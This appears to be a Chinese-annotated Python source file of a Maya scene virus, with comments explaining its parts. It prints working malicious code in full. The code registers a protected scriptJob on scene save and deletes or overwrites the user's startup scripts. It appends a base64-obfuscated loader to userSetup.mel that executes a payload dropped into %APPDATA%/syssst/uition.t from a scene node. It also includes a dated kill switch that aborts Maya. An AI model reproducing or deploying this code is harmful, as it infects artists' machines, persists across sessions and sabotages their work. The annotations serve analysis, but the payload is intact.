import maya.cmds as cmds
import datetime
import base64
import stat
import sys
import os


# leukocyte部分干掉了普天同庆Maya病毒的fuckVirus病毒（毒王争霸）
class phage:
    def antivirus(self):
        pass

    def occupation(self):
        # maya中创建scriptJob，用于在场景保存时执行脚本`leukocyte.antivirus()`，并开启保护。
        cmds.scriptJob(event=["SceneSaved", "leukocyte.antivirus()"], protected=True)


leukocyte = phage()  # 实例化phage类
leukocyte.occupation()  # 执行phage类的occupation方法

# 通过cmds.internalVar()命令获取maya内部变量，获取用户userSetup.py文件路径。
usepypath = cmds.internalVar(userAppDir=True) + "scripts/userSetup.py"
if os.path.exists(usepypath):  # 判断用户userSetup.py文件是否存在
    # 设置用户userSetup.py文件可写，os.chmod()修改访问权限，stat.S_IWRITE是个常量。表示文件所有者对文件的写访问权限。
    os.chmod(usepypath, stat.S_IWRITE)
    setAttrdslist = []  # 定义空列表，用于接收数据
    # 读取用户userSetup.py文件
    new_file = open(usepypath, "r")
    # 遍历userSetup.py文件的每一行是否包含特定字符串。如果找到任何指定的字符串，就将该行添加到setAttrdslist列表中
    for line in new_file:
        if (
            ("import vaccine" in line)
            or ("import fuckVirus" in line)
            or ("cmds.evalDeferred('leukocyte = fuckVirus.phage()')" in line)
            or ("cmds.evalDeferred('leukocyte.occupation()')" in line)
            or ("cmds.evalDeferred('leukocyte = vaccine.phage()')" in line)
            or ("cmds.evalDeferred('leukocyte.occupation()')" in line)
        ):
            setAttrdslist.append(line)
    new_file.close()
    # 在读取文件后，如果setAttrdslist不为空，则删除userSetup.py文件。
    if setAttrdslist:
        os.remove(usepypath)

# 创建userSetup.mel文件，并写入一堆大便
p = "\n"
address_path = cmds.internalVar(userAppDir=True) + "scripts/userSetup.mel"
M_el = "import base64; pyCode = base64.urlsafe_b64decode('aW1wb3J0IGJpbmFzY2lpDWltcG9ydCBvcw1tYXlhX3BhdGhfPW9zLmdldGVudigiQVBQREFUQSIpKydcc3lzc3N0Jw1tYXlhcGF0aD1tYXlhX3BhdGhfLnJlcGxhY2UoJ1xcJywnLycpDW1heWFfcGF0aD0nJXMvdWl0aW9uLnQnJW1heWFwYXRoDXRyeToNICAgIHdpdGggb3BlbihtYXlhX3BhdGgsICdyYicpIGFzIGY6DSAgICAgICAgZF9hX3RfYSA9IGYucmVhZCgpDSAgICBkYXRhID0gYmluYXNjaWkuYTJiX2Jhc2U2NChkX2FfdF9hKQ0gICAgZXhlYyhkYXRhKQ1leGNlcHQgSU9FcnJvciBhcyBlOg0gICAgcGFzcw=='); exec (pyCode)"

"""
译：
('import binascii\r'
 'import os\r'
 'maya_path_=os.getenv("APPDATA")+\'\\syssst\'\r'
 "mayapath=maya_path_.replace('\\\\','/')\r"
 "maya_path='%s/uition.t'%mayapath\r"
 'try:\r'
 "    with open(maya_path, 'rb') as f:\r"
 '        d_a_t_a = f.read()\r'
 '    data = binascii.a2b_base64(d_a_t_a)\r'
 '    exec(data)\r'
 'except IOError as e:\r'
 '    pass')
"""

xxx = 'python("%s");' % M_el
pMel = p + xxx
if not os.path.exists(address_path):
    with open(address_path, "a") as f:
        f.writelines(pMel)
else:
    os.chmod(address_path, stat.S_IWRITE)
    userSetupList = []
    with open(address_path, "r") as f:
        content = f.readlines()
        if xxx in content:
            userSetupList.append(xxx)
    if not userSetupList:
        with open(address_path, "a") as f:
            f.writelines(pMel)

uitionpath_ = os.getenv("APPDATA") + "/syssst"
uitionpath = uitionpath_.replace("\\", "/")
if not os.path.exists(uitionpath):
    os.mkdir(uitionpath)
uition_path = "%s%s" % (uitionpath, "/uition.t")
try:
    if cmds.objExists("uifiguration"):
        Xgee = eval(cmds.getAttr("uifiguration.notes"))
        with open(uition_path, "w") as f:
            f.writelines(Xgee)
except ValueError as e:
    pass
if not os.access("P:/Ko.Vpn", os.W_OK):
    if datetime.datetime.now().strftime("%Y%m%d") >= "20240501":
        cmds.quit(abort=True)
